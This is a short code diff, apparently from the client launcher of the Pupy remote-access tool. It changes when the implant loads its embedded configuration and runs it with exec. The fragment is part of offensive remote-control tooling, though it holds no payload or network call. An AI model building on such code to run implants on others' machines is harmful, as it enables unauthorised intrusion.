@@ -67,6 +67,7 @@ def add_pseudo_pupy_module():
 
 if "pupy" not in sys.modules:
     add_pseudo_pupy_module()
+
 import pupy
 pupy.infos={} #global dictionary to store informations persistent through a deconnection
 
@@ -173,7 +174,7 @@ def main():
     if not LAUNCHER in conf.launchers:
         exit("No such launcher: %s"%LAUNCHER)
 
-    if "windows" in platform.system().lower():
+    if 'get_pupy_config' in pupy.__dict__:
         try:
             config_file=pupy.get_pupy_config()
             exec config_file in globals()
